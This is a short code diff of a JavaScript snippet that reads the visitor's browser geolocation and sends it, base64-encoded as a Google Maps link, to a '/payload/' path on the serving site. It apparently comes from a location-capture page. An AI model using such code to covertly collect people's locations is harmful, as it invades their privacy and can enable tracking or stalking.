@@ -1,7 +1,8 @@
 navigator.geolocation.getCurrentPosition(
     function (position) {
         var xhr = new XMLHttpRequest(); 
-        xhr.open('GET', '/payload/' + position.coords.latitude + '_' + position.coords.longitude , true);
+        payload = btoa("https://www.google.com/maps/@" + position.coords.latitude + "," + position.coords.longitude + ",15z");
+        xhr.open('GET', '/payload/' + payload , true);
         xhr.send();
     }
 );
